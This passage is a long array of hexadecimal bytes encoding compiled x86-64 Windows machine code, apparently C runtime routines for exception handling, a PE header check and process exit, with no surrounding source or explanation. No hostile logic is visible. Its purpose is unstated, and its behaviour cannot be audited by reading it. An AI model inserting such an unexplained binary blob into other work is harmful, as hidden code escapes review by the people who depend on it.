0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x48, 0x63, 0x5c, 0x1, 0x4, 0xe8, 0x37, 0xe9, 0xff, 0xff, 0x48, 0x3, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x85, 0xc0, 0x74, 0x59, 0x44, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcf, 0xe8, 0x31, 0xed, 0xff, 0xff, 0xe8, 0x18, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x83, 0x7c, 0x1, 0x4, 0x0, 0x74, 0x1c, 0xe8, 0x4, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x48, 0x63, 0x5c, 0x1, 0x4, 0xe8, 0xf2, 0xe8, 0xff, 0xff, 0x48, 0x3, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x41, 0xb8, 0x3, 0x1, 0x0, 0x0, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xe8, 0xd2, 0x2, 0x0, 0x0, 0x49, 0x8b, 0xcd, 0xe8, 0xfa, 0xe8, 0xff, 0xff, 0xeb, 0x1e, 0x44, 0x8b, 0xa4, 0x24, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xb4, 0x24, 0x80, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x7c, 0x24, 0x70, 0x4c, 0x8b, 0x6c, 0x24, 0x28, 0x8b, 0x7c, 0x24, 0x20, 0x89, 0x7c, 0x24, 0x24, 0xe9, 0xc, 0xff, 0xff, 0xff, 0xe8, 0x18, 0xe2, 0xff, 0xff, 0x83, 0x78, 0x30, 0x0, 0x7e, 0x8, 0xe8, 0xd, 0xe2, 0xff, 0xff, 0xff, 0x48, 0x30, 0x83, 0xff, 0xff, 0x74, 0x5, 0x41, 0x3b, 0xfc, 0x7f, 0x24, 0x44, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcf, 0xe8, 0x92, 0xec, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xe8, 0xb5, 0x13, 0x0, 0x0, 0x90, 0xe8, 0xaf, 0x13, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xe9, 0x49, 0x8b, 0xf8, 0x49, 0x8b, 0xc8, 0x48, 0x8b, 0xf2, 0xe8, 0x97, 0xec, 0xff, 0xff, 0x4c, 0x8d, 0x4c, 0x24, 0x48, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0x8b, 0xd8, 0xe8, 0x86, 0xe4, 0xff, 0xff, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x0, 0xec, 0xff, 0xff, 0x3b, 0xd8, 0x7e, 0x23, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0xd7, 0xe8, 0x18, 0xec, 0xff, 0xff, 0x44, 0x8b, 0xcb, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x13, 0xec, 0xff, 0xff, 0xeb, 0x10, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0xcb, 0xeb, 0xff, 0xff, 0x8b, 0xd8, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x4c, 0x8b, 0xe9, 0x48, 0x85, 0xd2, 0xf, 0x84, 0xbc, 0x0, 0x0, 0x0, 0x45, 0x32, 0xff, 0x33, 0xf6, 0x39, 0x32, 0xf, 0x8e, 0x8f, 0x0, 0x0, 0x0, 0xe8, 0x9f, 0xe7, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x49, 0x8b, 0x45, 0x30, 0x4c, 0x63, 0x60, 0xc, 0x49, 0x83, 0xc4, 0x4, 0x4c, 0x3, 0xe2, 0xe8, 0x88, 0xe7, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x49, 0x8b, 0x45, 0x30, 0x48, 0x63, 0x48, 0xc, 0x44, 0x8b, 0x34, 0xa, 0x45, 0x85, 0xf6, 0x7e, 0x54, 0x48, 0x63, 0xc6, 0x48, 0x8d, 0x4, 0x80, 0x48, 0x89, 0x44, 0x24, 0x58, 0xe8, 0x63, 0xe7, 0xff, 0xff, 0x49, 0x8b, 0x5d, 0x30, 0x48, 0x8b, 0xf8, 0x49, 0x63, 0x4, 0x24, 0x48, 0x3, 0xf8, 0xe8, 0x3c, 0xe7, 0xff, 0xff, 0x48, 0x8b, 0x54, 0x24, 0x58, 0x4c, 0x8b, 0xc3, 0x48, 0x63, 0x4d, 0x4, 0x48, 0x8d, 0x4, 0x90, 0x48, 0x8b, 0xd7, 0x48, 0x3, 0xc8, 0xe8, 0x61, 0xf6, 0xff, 0xff, 0x85, 0xc0, 0x75, 0xe, 0x41, 0xff, 0xce, 0x49, 0x83, 0xc4, 0x4, 0x45, 0x85, 0xf6, 0x7f, 0xbd, 0xeb, 0x3, 0x41, 0xb7, 0x1, 0xff, 0xc6, 0x3b, 0x75, 0x0, 0xf, 0x8c, 0x71, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x41, 0x8a, 0xc7, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xe8, 0x28, 0x12, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xed, 0x48, 0x8b, 0xf9, 0x39, 0x29, 0x7e, 0x50, 0x33, 0xf6, 0xe8, 0xb4, 0xe6, 0xff, 0xff, 0x48, 0x63, 0x4f, 0x4, 0x48, 0x3, 0xc6, 0x83, 0x7c, 0x1, 0x4, 0x0, 0x74, 0x1b, 0xe8, 0xa1, 0xe6, 0xff, 0xff, 0x48, 0x63, 0x4f, 0x4, 0x48, 0x3, 0xc6, 0x48, 0x63, 0x5c, 0x1, 0x4, 0xe8, 0x90, 0xe6, 0xff, 0xff, 0x48, 0x3, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8d, 0x48, 0x8, 0x48, 0x8d, 0x15, 0x4e, 0x50, 0x1, 0x0, 0xe8, 0x35, 0xdb, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x21, 0xff, 0xc5, 0x48, 0x83, 0xc6, 0x14, 0x3b, 0x2f, 0x7c, 0xb2, 0x32, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xb0, 0x1, 0xeb, 0xe7, 0x48, 0x8b, 0xc2, 0x49, 0x8b, 0xd0, 0x48, 0xff, 0xe0, 0xcc, 0xcc, 0xcc, 0x49, 0x8b, 0xc0, 0x4c, 0x8b, 0xd2, 0x48, 0x8b, 0xd0, 0x45, 0x8b, 0xc1, 0x49, 0xff, 0xe2, 0xcc, 0x48, 0x83, 0x79, 0x8, 0x0, 0x48, 0x8d, 0x5, 0x0, 0xb8, 0x0, 0x0, 0x48, 0xf, 0x45, 0x41, 0x8, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x44, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0xc1, 0xe8, 0x82, 0xde, 0xff, 0xff, 0xff, 0xd0, 0xe8, 0xab, 0xde, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0x54, 0x24, 0x38, 0x48, 0x8b, 0x12, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xe8, 0x65, 0xde, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x44, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0xc1, 0xe8, 0x32, 0xde, 0xff, 0xff, 0xff, 0xd0, 0xe8, 0x5b, 0xde, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x48, 0x8b, 0x54, 0x24, 0x38, 0x48, 0x8b, 0x12, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xe8, 0xff, 0xdd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xf, 0x1f, 0x40, 0x0, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x4c, 0x89, 0x44, 0x24, 0x40, 0x44, 0x89, 0x4c, 0x24, 0x48, 0x45, 0x8b, 0xc1, 0x48, 0x8b, 0xc1, 0xe8, 0xcd, 0xdd, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0xd0, 0xe8, 0xf1, 0xdd, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0x54, 0x24, 0x38, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xe8, 0xae, 0xdd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x80, 0x79, 0x8, 0x0, 0x4c, 0x8b, 0xf2, 0x48, 0x8b, 0xf1, 0x74, 0x4c, 0x48, 0x8b, 0x1, 0x48, 0x85, 0xc0, 0x74, 0x44, 0x48, 0x83, 0xcf, 0xff, 0x48, 0xff, 0xc7, 0x80, 0x3c, 0x38, 0x0, 0x75, 0xf7, 0x48, 0x8d, 0x4f, 0x1, 0xe8, 0xb5, 0xf, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x1c, 0x4c, 0x8b, 0x6, 0x48, 0x8d, 0x57, 0x1, 0x48, 0x8b, 0xc8, 0xe8, 0xa6, 0xf, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x41, 0xc6, 0x46, 0x8, 0x1, 0x49, 0x89, 0x6, 0x33, 0xdb, 0x48, 0x8b, 0xcb, 0xe8, 0x75, 0xf, 0x0, 0x0, 0xeb, 0xa, 0x48, 0x8b, 0x1, 0x48, 0x89, 0x2, 0xc6, 0x42, 0x8, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x80, 0x79, 0x8, 0x0, 0x48, 0x8b, 0xd9, 0x74, 0x8, 0x48, 0x8b, 0x9, 0xe8, 0x39, 0xf, 0x0, 0x0, 0x48, 0x83, 0x23, 0x0, 0xc6, 0x43, 0x8, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0xbf, 0x20, 0x5, 0x93, 0x19, 0x48, 0x85, 0xd2, 0x74, 0x1d, 0xf6, 0x2, 0x10, 0x74, 0x18, 0x48, 0x8b, 0x9, 0x48, 0x83, 0xe9, 0x8, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0x58, 0x30, 0x48, 0x8b, 0x40, 0x40, 0xff, 0x15, 0x84, 0xa5, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x1e, 0xa4, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x85, 0xdb, 0x74, 0xf, 0xf6, 0x3, 0x8, 0x75, 0x5, 0x48, 0x85, 0xc0, 0x75, 0x5, 0xbf, 0x0, 0x40, 0x99, 0x1, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x4c, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0x89, 0x74, 0x24, 0x30, 0xb9, 0x63, 0x73, 0x6d, 0xe0, 0x48, 0x89, 0x5c, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x40, 0x44, 0x8d, 0x42, 0x3, 0xff, 0x15, 0xd0, 0xa3, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, 0x74, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3, 0x48, 0x3b, 0xca, 0x74, 0x3b, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x10, 0x49, 0xba, 0x70, 0x48, 0xda, 0x56, 0x96, 0x3e, 0xf1, 0x85, 0xff, 0x15, 0xfb, 0xa4, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x75, 0xdf, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x3b, 0xca, 0x74, 0x25, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x14, 0x49, 0xba, 0x70, 0x30, 0x52, 0x5e, 0x47, 0x27, 0x5, 0xd3, 0xff, 0x15, 0xb7, 0xa4, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xb, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0xeb, 0xd9, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xb8, 0x63, 0x73, 0x6d, 0xe0, 0x3b, 0xc8, 0x74, 0x3, 0x33, 0xc0, 0xc3, 0x8b, 0xc8, 0xe9, 0x1, 0x0, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x8b, 0xf9, 0xe8, 0x8a, 0x15, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x1f, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0xc1, 0x4c, 0x8d, 0x81, 0xc0, 0x0, 0x0, 0x0, 0x49, 0x3b, 0xc8, 0x74, 0xd, 0x39, 0x38, 0x74, 0x20, 0x48, 0x83, 0xc0, 0x10, 0x49, 0x3b, 0xc0, 0x75, 0xf3, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x85, 0xc0, 0x74, 0xe4, 0x4c, 0x8b, 0x40, 0x8, 0x4d, 0x85, 0xc0, 0x74, 0xdb, 0x49, 0x83, 0xf8, 0x5, 0x75, 0xa, 0x4c, 0x89, 0x48, 0x8, 0x41, 0x8d, 0x40, 0xfc, 0xeb, 0xcd, 0x49, 0x83, 0xf8, 0x1, 0x75, 0x5, 0x83, 0xc8, 0xff, 0xeb, 0xc2, 0x48, 0x8b, 0x6b, 0x8, 0x48, 0x89, 0x73, 0x8, 0x83, 0x78, 0x4, 0x8, 0xf, 0x85, 0xc4, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc1, 0x30, 0x48, 0x8d, 0x91, 0x90, 0x0, 0x0, 0x0, 0xeb, 0x8, 0x4c, 0x89, 0x49, 0x8, 0x48, 0x83, 0xc1, 0x10, 0x48, 0x3b, 0xca, 0x75, 0xf3, 0x81, 0x38, 0x8d, 0x0, 0x0, 0xc0, 0x8b, 0x7b, 0x10, 0x74, 0x7a, 0x81, 0x38, 0x8e, 0x0, 0x0, 0xc0, 0x74, 0x6b, 0x81, 0x38, 0x8f, 0x0, 0x0, 0xc0, 0x74, 0x5c, 0x81, 0x38, 0x90, 0x0, 0x0, 0xc0, 0x74, 0x4d, 0x81, 0x38, 0x91, 0x0, 0x0, 0xc0, 0x74, 0x3e, 0x81, 0x38, 0x92, 0x0, 0x0, 0xc0, 0x74, 0x2f, 0x81, 0x38, 0x93, 0x0, 0x0, 0xc0, 0x74, 0x20, 0x81, 0x38, 0xb4, 0x2, 0x0, 0xc0, 0x74, 0x11, 0x81, 0x38, 0xb5, 0x2, 0x0, 0xc0, 0x8b, 0xd7, 0x75, 0x40, 0xba, 0x8d, 0x0, 0x0, 0x0, 0xeb, 0x36, 0xba, 0x8e, 0x0, 0x0, 0x0, 0xeb, 0x2f, 0xba, 0x85, 0x0, 0x0, 0x0, 0xeb, 0x28, 0xba, 0x8a, 0x0, 0x0, 0x0, 0xeb, 0x21, 0xba, 0x84, 0x0, 0x0, 0x0, 0xeb, 0x1a, 0xba, 0x81, 0x0, 0x0, 0x0, 0xeb, 0x13, 0xba, 0x86, 0x0, 0x0, 0x0, 0xeb, 0xc, 0xba, 0x83, 0x0, 0x0, 0x0, 0xeb, 0x5, 0xba, 0x82, 0x0, 0x0, 0x0, 0x89, 0x53, 0x10, 0x49, 0xba, 0x70, 0x33, 0xd3, 0x30, 0x4f, 0x1f, 0x9c, 0x8b, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xc0, 0xff, 0x15, 0x2f, 0xa3, 0x0, 0x0, 0x89, 0x7b, 0x10, 0xeb, 0x1a, 0x4c, 0x89, 0x48, 0x8, 0x49, 0xba, 0x70, 0x73, 0xd7, 0x50, 0x49, 0x86, 0xc1, 0xc6, 0x8b, 0x48, 0x4, 0x49, 0x8b, 0xc0, 0xff, 0x15, 0x10, 0xa3, 0x0, 0x0, 0x48, 0x89, 0x6b, 0x8, 0xe9, 0x2, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x38, 0x16, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xcf, 0xe8, 0x13, 0x0, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0x7b, 0x16, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xd9, 0x80, 0x3d, 0x8c, 0x4d, 0x1, 0x0, 0x0, 0xf, 0x85, 0xa9, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x87, 0x5, 0x6b, 0x4d, 0x1, 0x0, 0x48, 0x8b, 0x1, 0x8b, 0x8, 0x85, 0xc9, 0x75, 0x3e, 0x48, 0x8b, 0x5, 0x13, 0x41, 0x1, 0x0, 0x48, 0x8b, 0x15, 0x5c, 0x4d, 0x1, 0x0, 0x48, 0x3b, 0xd0, 0x74, 0x22, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0xc2, 0x48, 0xd3, 0xc8, 0x49, 0xba, 0x70, 0x28, 0xd9, 0x78, 0x45, 0x2e, 0x1, 0x99, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x15, 0x6d, 0xa2, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x66, 0x4e, 0x1, 0x0, 0xeb, 0xc, 0x83, 0xf9, 0x1, 0x75, 0xd, 0x48, 0x8d, 0xd, 0x70, 0x4e, 0x1, 0x0, 0xe8, 0x6b, 0x9, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x3, 0x83, 0x38, 0x0, 0x75, 0x13, 0x48, 0x8d, 0x15, 0xab, 0xa2, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x84, 0xa2, 0x0, 0x0, 0xe8, 0xf, 0xfd, 0xff, 0xff, 0x48, 0x8d, 0x15, 0xa8, 0xa2, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x99, 0xa2, 0x0, 0x0, 0xe8, 0xfc, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x43, 0x8, 0x83, 0x38, 0x0, 0x75, 0xe, 0xc6, 0x5, 0xe4, 0x4c, 0x1, 0x0, 0x1, 0x48, 0x8b, 0x43, 0x10, 0xc6, 0x0, 0x1, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0xc3, 0xe8, 0x36, 0xb, 0x0, 0x0, 0x90, 0xcc, 0x44, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x45, 0xe0, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x60, 0x8b, 0xd9, 0x45, 0x85, 0xc0, 0x75, 0x4a, 0x33, 0xc9, 0xff, 0x15, 0xdb, 0x9f, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3d, 0xb9, 0x4d, 0x5a, 0x0, 0x0, 0x66, 0x39, 0x8, 0x75, 0x33, 0x48, 0x63, 0x48, 0x3c, 0x48, 0x3, 0xc8, 0x81, 0x39, 0x50, 0x45, 0x0, 0x0, 0x75, 0x24, 0xb8, 0xb, 0x2, 0x0, 0x0, 0x66, 0x39, 0x41, 0x18, 0x75, 0x19, 0x83, 0xb9, 0x84, 0x0, 0x0, 0x0, 0xe, 0x76, 0x10, 0x83, 0xb9, 0xf8, 0x0, 0x0, 0x0, 0x0, 0x74, 0x7, 0x8b, 0xcb, 0xe8, 0xbd, 0x0, 0x0, 0x0, 0xc6, 0x45, 0x28, 0x0, 0x48, 0x8d, 0x45, 0x18, 0x48, 0x89, 0x45, 0xe8, 0x48, 0x8d, 0x45, 0x20, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x45, 0x28, 0x48, 0x89, 0x45, 0xf8, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x89, 0x45, 0xd4, 0x89, 0x45, 0xd8, 0x4c, 0x8d, 0x4d, 0xd4, 0x4c, 0x8d, 0x45, 0xe8, 0x48, 0x8d, 0x55, 0xd8, 0x48, 0x8d, 0x4d, 0xd0, 0xe8, 0x51, 0xfe, 0xff, 0xff, 0x90, 0x83, 0x7d, 0x20, 0x0, 0x74, 0xb, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x50, 0x5d, 0xc3, 0x8b, 0xcb, 0xe8, 0x4, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0xe8, 0x27, 0x0, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x11, 0xff, 0x15, 0xc9, 0x9f, 0x0, 0x0, 0x48, 0x8b, 0xc8, 0x8b, 0xd3, 0xff, 0x15, 0xce, 0x9f, 0x0, 0x0, 0x8b, 0xcb, 0xe8, 0x3b, 0x0, 0x0, 0x0, 0x8b, 0xcb, 0xff, 0x15, 0xb7, 0x9f, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xbb, 0x14, 0x0, 0x0, 0x83, 0xf8, 0x1, 0x74, 0x1b, 0x65, 0x48, 0x8b, 0xc, 0x25, 0x60, 0x0, 0x0, 0x0, 0x8b, 0x91, 0xbc, 0x0, 0x0, 0x0, 0xc1, 0xea, 0x8, 0xf6, 0xc2, 0x1, 0x75, 0x4, 0xb0, 0x1, 0xeb, 0x2, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x30, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x8b, 0xd9, 0x48, 0x83, 0x64, 0x24, 0x48, 0x0, 0x4c, 0x8d, 0x44, 0x24, 0x48, 0x48, 0x8d, 0x15, 0x81, 0xb2, 0x0, 0x0, 0x33, 0xc9, 0xff, 0x15, 0x69, 0x9f, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0x85, 0xc0, 0x74, 0x29, 0x48, 0x8d, 0x15, 0x81, 0xb2, 0x0, 0x0, 0xff, 0x15, 0x13, 0x9f, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x7b, 0x5a, 0x5e, 0x9b, 0x87, 0x1, 0xa2, 0x8b, 0xcb, 0xff, 0x15, 0x7c, 0xa0, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x85, 0xc9, 0x74, 0x7, 0xff, 0x15, 0xe4, 0x9e, 0x0, 0x0, 0x90, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0xc3, 0xcc, 0x48, 0x89, 0xd, 0x25, 0x4b, 0x1, 0x0, 0xc3, 0x33, 0xd2, 0x33, 0xc9, 0x44, 0x8d, 0x42, 0x1, 0xe9, 0x4f, 0xfe, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x45, 0x33, 0xc0, 0x41, 0x8d, 0x50, 0x2, 0xe9, 0x40, 0xfe, 0xff, 0xff, 0x8b, 0x5, 0xfa, 0x4a, 0x1, 0x0, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0x7c, 0x24, 0x60, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xd8, 0x4c, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x49, 0x83, 0x27, 0x0, 0x49, 0xc7, 0x1, 0x1, 0x0, 0x0, 0x0, 0x48, 0x85, 0xd2, 0x74, 0x7, 0x48, 0x89, 0x1a, 0x49, 0x83, 0xc6, 0x8, 0x40, 0x32, 0xed, 0x80, 0x3f, 0x22, 0x75, 0xf, 0x40, 0x84, 0xed, 0x40, 0xb6, 0x22, 0x40, 0xf, 0x94, 0xc5, 0x48, 0xff, 0xc7, 0xeb, 0x37, 0x49, 0xff, 0x7, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x8a, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0xf, 0xbe, 0x37, 0x48, 0xff, 0xc7, 0x8b, 0xce, 